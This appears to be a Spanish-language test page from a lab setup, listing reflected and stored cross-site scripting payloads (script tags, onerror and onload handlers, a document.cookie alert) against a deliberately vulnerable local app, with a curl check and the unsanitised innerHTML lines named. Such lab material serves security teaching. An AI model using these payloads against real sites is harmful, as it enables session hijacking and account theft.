@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pruebas XSS</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f5f5f5; }
+        .test { background: white; margin: 10px 0; padding: 15px; border-radius: 5px; border-left: 4px solid #667eea; }
+        h1 { color: #667eea; }
+        h3 { color: #764ba2; }
+        code { background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
+        .success { color: green; font-weight: bold; }
+        .info { color: #666; margin-top: 5px; }
+        a { color: #667eea; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <h1>🔍 Pruebas de Vulnerabilidad XSS</h1>
+    <p><strong>URL del servidor:</strong> <a href="http://localhost:8082" target="_blank">http://localhost:8082</a></p>
+    
+    <h2>Payloads XSS para probar:</h2>
+    
+    <div class="test">
+        <h3>1. XSS Reflejado - Alert básico</h3>
+        <p><strong>Payload:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+        <p><strong>URL:</strong> <a href="http://localhost:8082/?search=<script>alert('XSS')</script>" target="_blank">Probar aquí</a></p>
+        <p class="info">Este payload muestra una alerta si la vulnerabilidad existe</p>
+    </div>
+    
+    <div class="test">
+        <h3>2. XSS Reflejado - Imagen con onerror</h3>
+        <p><strong>Payload:</strong> <code>&lt;img src=x onerror=alert('XSS')&gt;</code></p>
+        <p><strong>URL:</strong> <a href="http://localhost:8082/?search=<img src=x onerror=alert('XSS')>" target="_blank">Probar aquí</a></p>
+        <p class="info">Utiliza un evento onerror para ejecutar JavaScript</p>
+    </div>
+    
+    <div class="test">
+        <h3>3. XSS Reflejado - SVG con onload</h3>
+        <p><strong>Payload:</strong> <code>&lt;svg/onload=alert('XSS')&gt;</code></p>
+        <p><strong>URL:</strong> <a href="http://localhost:8082/?search=<svg/onload=alert('XSS')>" target="_blank">Probar aquí</a></p>
+        <p class="info">Usa un elemento SVG para ejecutar código</p>
+    </div>
+    
+    <div class="test">
+        <h3>4. XSS Reflejado - Body onload</h3>
+        <p><strong>Payload:</strong> <code>&lt;body onload=alert('XSS')&gt;</code></p>
+        <p><strong>URL:</strong> <a href="http://localhost:8082/?search=<body onload=alert('XSS')>" target="_blank">Probar aquí</a></p>
+        <p class="info">Intenta inyectar un evento onload</p>
+    </div>
+    
+    <div class="test">
+        <h3>5. XSS Reflejado - HTML + JavaScript</h3>
+        <p><strong>Payload:</strong> <code>&lt;h1 style="color:red"&gt;HACKED&lt;/h1&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+        <p><strong>URL:</strong> <a href="http://localhost:8082/?search=<h1 style='color:red'>HACKED</h1><script>alert(document.cookie)</script>" target="_blank">Probar aquí</a></p>
+        <p class="info">Combina HTML y JavaScript para modificar la página</p>
+    </div>
+    
+    <h2>XSS Almacenado (Stored XSS):</h2>
+    
+    <div class="test">
+        <h3>6. XSS Almacenado - Formulario de comentarios</h3>
+        <p><strong>Instrucciones:</strong></p>
+        <ol>
+            <li>Ve a <a href="http://localhost:8082" target="_blank">http://localhost:8082</a></li>
+            <li>En el formulario de comentarios, ingresa:
+                <ul>
+                    <li><strong>Nombre:</strong> <code>&lt;img src=x onerror=alert('XSS Almacenado')&gt;</code></li>
+                    <li><strong>Comentario:</strong> <code>Este es un comentario malicioso &lt;script&gt;alert('Persistente')&lt;/script&gt;</code></li>
+                </ul>
+            </li>
+            <li>Haz clic en "Publicar Comentario"</li>
+            <li>El payload se ejecutará cada vez que se cargue la página</li>
+        </ol>
+        <p class="info">Este XSS se almacena en localStorage y se ejecuta cada vez que alguien visita la página</p>
+    </div>
+    
+    <h2>Verificación con curl:</h2>
+    
+    <div class="test">
+        <h3>7. Verificar inyección desde terminal</h3>
+        <p><strong>Comando:</strong></p>
+        <code style="display:block; padding:10px; background:#2d2d2d; color:#f8f8f8; margin:10px 0;">
+curl "http://localhost:8082/?search=&lt;script&gt;alert('XSS')&lt;/script&gt;" | grep "searchTermSpan.innerHTML"
+        </code>
+        <p class="info">Verifica que el código malicioso se inyecta directamente en el HTML sin sanitización</p>
+    </div>
+    
+    <hr style="margin: 30px 0;">
+    
+    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; border: 1px solid #ffc107;">
+        <p class="success">✅ Si alguna de estas pruebas ejecuta JavaScript (muestra alertas o modifica la página), la vulnerabilidad XSS está confirmada.</p>
+    </div>
+    
+    <h2>📊 Información técnica:</h2>
+    <div class="test">
+        <p><strong>Tipo de vulnerabilidad:</strong> Cross-Site Scripting (XSS)</p>
+        <p><strong>Variantes presentes:</strong></p>
+        <ul>
+            <li><strong>Reflected XSS:</strong> A través del parámetro <code>?search=</code></li>
+            <li><strong>Stored XSS:</strong> A través del formulario de comentarios (localStorage)</li>
+        </ul>
+        <p><strong>Código vulnerable:</strong></p>
+        <ul>
+            <li>Línea con <code>searchTermSpan.innerHTML = searchTerm;</code> (sin sanitización)</li>
+            <li>Línea con <code>commentsDiv.innerHTML += ...</code> (sin sanitización)</li>
+        </ul>
+        <p><strong>Acceso:</strong></p>
+        <ul>
+            <li>Puerto: 8082</li>
+            <li>IP en red Docker: 172.19.0.12</li>
+            <li>Red Docker: br_vuln</li>
+        </ul>
+    </div>
+</body>
+</html>
